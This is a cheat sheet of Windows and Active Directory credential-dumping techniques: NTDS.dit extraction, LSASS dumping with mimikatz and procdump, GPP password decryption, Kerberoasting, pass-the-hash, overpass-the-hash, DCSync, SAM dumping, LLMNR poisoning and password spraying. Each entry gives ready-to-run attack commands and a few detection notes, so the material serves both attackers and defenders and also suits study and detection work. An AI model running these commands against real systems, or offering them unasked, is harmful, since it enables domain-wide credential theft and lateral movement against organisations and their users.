Credential Dumping (General)

1- NTDS.dit Dump (Domain Controller Password Hashes)

  • Description:

NTDS.dit contains all AD user password hashes. Attackers extract it to obtain domain credentials.

  • Methods:
    • ntdsutil:

``powershell ntdsutil "ac i ntds" "ifm" "create full <output_dir>" quit quit ``

    • Volume Shadow Copy:

``powershell vssadmin create shadow /for=C: ``

Access NTDS.dit from the shadow copy.

    • Impacket secretsdump:

``powershell secretsdump.py domain/admin@dc_ip -hashes lmhash:nthash ``

  • Detection:
    • Monitor access to NTDS.dit and shadow copies.
    • Event 4662 (replication requests) from non-DC accounts.

2- LSASS Memory Dump

  • Description:

LSASS stores credentials in memory; attackers dump it to extract hashes and plaintext passwords.

  • Methods:
    • Mimikatz:

``powershell mimikatz # sekurlsa::logonpasswords ``

    • ProcDump:

``powershell procdump64.exe -ma lsass.exe lsass.dmp mimikatz # sekurlsa::minidump lsass.dmp mimikatz # sekurlsa::logonpasswords ``

  • Detection:
    • Sysmon Event 10 (process dump of LSASS).
    • Enable Credential Guard to protect LSASS.

3- Group Policy Preferences (GPP) Passwords

  • Description:

Older Windows GPP stored plaintext credentials in XML files.

  • Method:
    • Access GPP XMLs:

``powershell \\<domain_controller>\SYSVOL\<domain>\Policies\ ``

    • Decrypt:

``bash gpp-decrypt <encrypted_password> ``

  • Detection:
    • Monitor access to GPP files.
    • Remove hardcoded credentials.

4- Kerberoasting

  • Description:

Extract service account passwords by requesting Kerberos TGS tickets and cracking offline.

  • Method:

``powershell Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName Rubeus.exe kerberoast ``

Crack tickets offline with Hashcat.

  • Detection:
    • Event 4769 with unusual TGS requests or encryption types 0x17/0x18.
    • Abnormal TGS requests from non-service accounts.

5- Pass-the-Hash (PtH)

  • Description:

Authenticate to remote systems using NTLM hashes instead of plaintext passwords.

  • Method:

``powershell psexec.py domain/user@target_ip -hashes lmhash:nthash ``

  • Detection:
    • Event 4624 (Logon Type 3 or 10) using NTLM.

6- Overpass-the-Hash (NTLM → Kerberos)

  • Description:

Use NTLM hash to request a Kerberos TGT without knowing the plaintext password.

  • Method:

``powershell mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:<hash> ``

  • Detection:
    • Event 4769 for suspicious TGT requests.
    • Abnormal ticket lifetimes.

7- DCSync Attack

  • Description:

Simulate a DC to pull password hashes from Active Directory.

  • Method:

``powershell mimikatz # lsadump::dcsync /domain:<domain> /user:<username> ``

  • Detection:
    • Event 4662 for replication rights accessed by unauthorized accounts.
    • Monitor suspicious DC replication attempts.

8- SAM & SYSTEM Dump

  • Description:

Extract local account hashes from Windows SAM database.

  • Method:

``powershell copy C:\Windows\System32\config\SAM C:\Temp copy C:\Windows\System32\config\SYSTEM C:\Temp samdump2 SYSTEM SAM > hashes.txt ``

  • Detection:
    • Monitor file access to C:\Windows\System32\config\SAM.

9- LLMNR/NBT-NS Poisoning

  • Description:

Capture NTLM hashes over the network by poisoning LLMNR or NetBIOS Name Service.

  • Method:

``bash responder -I eth0 ``

Hashes can be cracked offline.

  • Detection:
    • Disable LLMNR/NBT-NS to prevent poisoning.
    • Alert on unexpected NBNS traffic.

10- Password Spraying

  • Description:

Brute-force multiple accounts using a common password to avoid lockouts.

  • Method:

``bash crackmapexec smb <target_ip> -u usernames.txt -p commonpassword hydra -L users.txt -P passwords.txt ssh://target_ip ``

  • Detection:
    • Event 4625 for multiple failed login attempts.
    • Enforce account lockout policies.
